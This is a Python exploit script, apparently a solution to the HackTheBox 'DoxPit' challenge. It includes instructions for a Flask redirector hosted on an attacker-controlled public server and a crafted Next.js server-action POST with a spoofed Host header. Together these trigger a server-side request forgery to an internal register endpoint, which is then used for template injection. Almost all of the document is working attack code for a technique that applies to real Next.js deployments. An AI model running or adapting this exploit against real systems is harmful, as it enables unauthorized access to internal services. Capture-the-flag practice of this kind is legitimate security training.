#!/usr/bin/env python3

"""
Created this script to solve the HackTheBox challenge called 'DoxPit'.  
This script exploits a server side request forgery that is then leveraged to exploit a server side
template injection that is only accessible using the server side request forgery.
"""

"""
Follow the below steps before running the script:

Step 1: Use a server that is publicly accessible
Step 2: On the publicly accessible server, write the following script and call it "app.py":
    #!/usr/bin/env python3
    from flask import Flask, Response, request, redirect, url_for
    app = Flask(__name__)
    @app.route('/', defaults={'path': ''})
    @app.route('/<path:path>')
    def catch(path):
        if request.method == 'HEAD':
            resp = Response("")
            resp.headers['Content-Type'] = 'text/x-component'
            return resp
        username="johnwick"
        password="Johnwick3$"
        return redirect(f'http://127.0.0.1:3000/register?username={username}&password={password}')

Step 3:  flask run --host=0.0.0.0
"""  

import requests

def ssrf_ssti():
    proxies={"http":"http://127.0.0.1:8080"}
    url="94.237.49.212:38383"  # Replace Target url
    SSRF_HOST="54.157.213.44:5000"  # Replace with the public server ip where you are hosting the script above
    headers={
        "Host":f"{SSRF_HOST}",    
        "Next-Router-State-Tree":"%5B%22%22%2C%7B%22children%22%3A%5B%22__PAGE__%22%2C%7B%7D%5D%7D%2Cnull%2Cnull%2Ctrue%5D",
        "Next-Action":"0b0da34c9bad83debaebc8b90e4d5ec7544ca862",
        "Content-Type":"multipart/form-data; boundary=----WebKitFormBoundaryKt0dAPqZGN8Wlx98",
    }
    data="""
------WebKitFormBoundaryKt0dAPqZGN8Wlx98
Content-Disposition: form-data; name="1_$ACTION_ID_0b0da34c9bad83debaebc8b90e4d5ec7544ca862"


------WebKitFormBoundaryKt0dAPqZGN8Wlx98
Content-Disposition: form-data; name="0"

["$K1"]
------WebKitFormBoundaryKt0dAPqZGN8Wlx98--

    """
    data2 = data.replace("\n", "\r\n")

    response=requests.post(url=f"http://{url}", proxies=proxies, headers=headers, data=data2)
    print(response.text)

ssrf_ssti()
